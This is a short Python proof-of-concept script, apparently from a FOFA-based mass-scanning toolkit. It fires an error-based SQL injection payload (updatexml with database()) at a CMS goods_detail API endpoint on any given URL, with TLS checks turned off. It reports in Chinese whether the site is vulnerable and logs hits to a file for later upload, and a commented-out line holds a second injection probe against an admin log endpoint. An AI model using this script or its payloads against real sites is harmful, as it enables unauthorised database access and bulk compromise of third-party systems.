import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from fofa_poc.upload_poc.upload import upload

# CMS架构poc验证
def cms_poc(pocurl):

    # target_url = pocurl + "/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0‘"
    target_url = pocurl +"/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)"
    # poc_file = open('poc.txt', 'w', encoding='utf-8')
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=target_url, verify=False, timeout=5)
        print("正在测试：",target_url)
        if "syntax" in response.text:
            print("存在sql注入")
            with open(r"poc.txt","a+") as p:
                p.write(target_url + '\n')
                # upload(upload_poc)
        else:
            print("不存在sql注入")
            from fofa_poc.upload_poc.upload import upload
    except Exception as e :
        print("\033[31m[x] 请求失败 \033[0m", e)
